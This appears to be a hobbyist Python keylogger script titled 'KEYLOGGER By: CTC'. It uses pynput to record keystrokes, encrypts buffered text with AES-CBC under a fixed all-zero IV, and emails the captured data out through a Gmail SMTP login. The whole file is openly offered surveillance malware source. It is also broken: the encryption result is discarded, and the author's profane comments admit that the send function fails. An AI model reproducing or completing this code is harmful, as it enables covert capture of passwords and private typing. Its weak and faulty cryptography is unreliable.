#! /usr/bin/python3

#Imports
import getpass
import smtplib
import base64
import hashlib
from Crypto.Cipher import AES
from pynput.keyboard import Key, Controller, Listener
from Crypto import Random





# Logo
print ("""================================================================""")
print (r"""
 _   __ _____ __   __ _      _____  _____  _____  _____ ______ 
| | / /|  ___|\ \ / /| |    |  _  ||  __ \|  __ \|  ___|| ___ \
| |/ / | |__   \ V / | |    | | | || |  \/| |  \/| |__  | |_/ /
|    \ |  __|   \ /  | |    | | | || | __ | | __ |  __| |    / 
| |\  \| |___   | |  | |____\ \_/ /| |_\ \| |_\ \| |___ | |\ \ 
\_| \_/\____/   \_/  \_____/ \___/  \____/ \____/\____/ \_| \_|
                                                             """)
print ("""================================================================""")
print("""By: CTC """)

#Asks user for input, then sets up a mail account to send the input to
#Resource from: https://realpython.com/python-send-email/
email = input('Enter Your Email: ')
password = getpass.getpass(prompt='Password: ', stream=None)
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)
password = input('Enter your desired AES Password: ')
print('Everything is setup, the keylogger may start')

#Defining the essential variables
key = ''
key_bytes = ''
plaintext = ''
ciphertext = ''
raw = ''
data_to_be_sent = ''
full_log = ''
word = ''
iv = ''

#Building the keylogger (seems to work just fine)
def on_press(key):
    global word
    global full_log
    global email
    global email_char_lim
    global data_to_be_encrypted
    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        word = ''
        if len(full_log) == 32:
              data_to_be_encrypted = full_log
              full_log = ''
              encrypt(data_to_be_encrypted, password)
              data_to_be_encrypted = ''
              send_log()
              ciphertext = ''
           
    elif key == Key.shift_l or key == Key.shift_r:
           return
    elif key == Key.backspace:
      word = word[:-1]
    else:
       char = f'{key}'
       char = char[1:-1]
       word += char
   
    if key == Key.esc:
     return False

#My most precious fucking encryption function i swear i will fucking kill this piece of shit code

def pad_message(data_to_be_encrypted):
    while len(data_to_be_encrypted)% 16 != 0:
      data_to_be_encrypted = data_to_be_encrypted + " "
    return data_to_be_encrypted

def encrypt(data_to_be_encrypted, password):

    
    private_key = hashlib.sha256(password.encode("utf-8")).digest()
    mode = AES.MODE_CBC
    padded_message = pad_message(data_to_be_encrypted)
    iv = 16 * b'\x00'
    cipher = AES.new(private_key, mode, iv)
    ciphertext = cipher.encrypt(padded_message)
    print(ciphertext)
    return ciphertext, iv, private_key


    
    




#This shit ddefines the send_log function which does not seem to work cuz int object has no attribute 'lower'
def send_log():
  global iv
  global key
  global ciphertext
  server.sendmail(
          email,
          email,
          ciphertext
     )
  server.sendmail(
          email,
          email,
          iv
     )
  server.sendmail(
          email,
          email,
          key
     )
#This stuff starts the listener shit
with Listener( on_press=on_press ) as listener:
      listener.join()
